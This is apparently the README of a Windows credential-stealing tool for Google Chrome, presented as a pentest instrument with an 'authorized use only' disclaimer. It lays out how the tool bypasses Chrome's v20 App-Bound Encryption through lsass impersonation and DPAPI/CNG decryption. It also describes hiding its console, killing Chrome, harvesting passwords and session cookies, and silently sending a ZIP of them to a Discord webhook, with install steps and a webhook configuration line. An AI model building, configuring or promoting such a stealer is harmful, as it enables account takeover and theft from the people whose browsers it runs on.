# Chrome-Browser-Stealer

**Advanced Chrome Credential Extraction Tool · v20 App-Bound Encryption Bypass**

[![Python 3.8+](https://img.shields.io/badge/Python-3.8%2B-blue)](https://python.org)
[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey)]()
[![License](https://img.shields.io/badge/License-MIT-green)]()

Chrome-Browser-Stealer is a precision instrument for authorized penetration testers and security researchers. It extracts saved credentials from Google Chrome (v127+), bypassing the latest **v20 App-Bound Encryption** through SYSTEM-level token impersonation and DPAPI/CNG decryption chains, then exfiltrates findings as a structured ZIP archive to a Discord webhook.

> ⚠️ **Authorized Use Only** — This tool is designed exclusively for legitimate security assessments with explicit written permission from the system owner. Unauthorized use violates computer fraud and abuse laws globally.

---

## Capabilities

| Capability | Details |
|-----------|---------|
| **Chrome v127+ (v20)** | Full support for App-Bound Encryption — the latest Chrome credential protection |
| **Multi-Profile Extraction** | Iterates all Chrome profiles (Default, Profile 1, Profile 2, ...) |
| **Password Extraction** | Decrypts saved credentials: URL, username, plaintext password |
| **Cookie Extraction** | Decrypts session cookies from the Default profile |
| **Three Decryption Paths** | AES-128-GCM, ChaCha20-Poly1305, and CNG + XOR (flag 1/2/3) |
| **lsass Token Impersonation** | SYSTEM-level DPAPI via SeDebugPrivilege for App-Bound key access |
| **CNG Integration** | Windows Cryptography Next Generation API for flag 3 key decryption |
| **Stealth Execution** | Hidden console window, suppressed error dialogs, muted I/O |
| **ZIP Packaging** | Structured archive containing passwords.json + cookies.json + info.txt |
| **Discord Exfiltration** | Single HTTPS POST with embedded summary and file attachment |

---

## Encryption Architecture

Chrome's credential protection has evolved significantly:

| Chrome Version | Encryption Scheme | Value Prefix | Key Protection |
|---------------|-------------------|-------------|----------------|
| < v80 | DPAPI (per-value) | None | Windows DPAPI, no master key |
| v80 – v126 | AES-256-GCM | `v10` / `v11` | Single DPAPI-protected key in `Local State` |
| **v127+** | **App-Bound (v20)** | **`v20`** | **Double DPAPI (SYSTEM→User) + optional CNG** |

### v20 Decryption Chain
Local State └─ os_crypt.app_bound_encrypted_key (base64, "APPB" prefix) └─ Strip "APPB" header └─ DPAPI unprotect @ SYSTEM level (via lsass impersonation) └─ DPAPI unprotect @ User level └─ Parse Key Blob ├─ Flag 1 → AES-128-GCM (static Chrome key) ├─ Flag 2 → ChaCha20-Poly1305 (static Chrome key) └─ Flag 3 → NCryptDecrypt + XOR → AES-128-GCM └─ Master Key → decrypt v20 credential values

### Flag 3 — CNG Path Detail

Flag 3 leverages Windows Cryptography Next Generation:
1. Opens `Microsoft Software Key Storage Provider`
2. Retrieves key `"Google Chromekey1"` from the CNG key store
3. Decrypts the wrapped AES key via `NCryptDecrypt`
4. XORs the result against a static obfuscation key
5. Uses the output as the AES-128-GCM master key

---

## Requirements

### Software

| Requirement | Version |
|------------|---------|
| Operating System | Windows 10 / 11 (x64) |
| Python | 3.8+ |
| Google Chrome | v127+ (with saved credentials) |
| Privileges | Administrator (SeDebugPrivilege required) |

### Python Dependencies
requests>=2.31.0 windows>=0.2.2 cryptography>=41.0.0 pywin32>=306

---

## Installation

```bash
git clone https://github.com/YOUR_USERNAME/Chrome-Browser-Stealer.git
cd Chrome-Browser-Stealer
pip install -r requirements.txt

Configuration
Open chrome_stealer.py
Locate the configuration block at the top of the file
Replace the webhook URL with your own Discord webhook:
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN"

###Execution Flow
Step	Action
1	Hides console window and suppresses error dialogs
2	Verifies Administrator privileges (exits silently if not)
3	Terminates all running Chrome processes
4	Reads and parses %LOCALAPPDATA%\Google\Chrome\User Data\Local State
5	Extracts the App-Bound encrypted key blob
6	Impersonates lsass for SYSTEM-level DPAPI decryption
7	Performs user-level DPAPI decryption
8	Parses the key blob and derives the master key (flag 1/2/3)
9	Iterates all Chrome profiles for saved passwords
10	Extracts cookies from the Default profile
11	Packages findings into a timestamped ZIP archive
12	Exfiltrates the ZIP to the configured Discord webhook
13	Exits silently
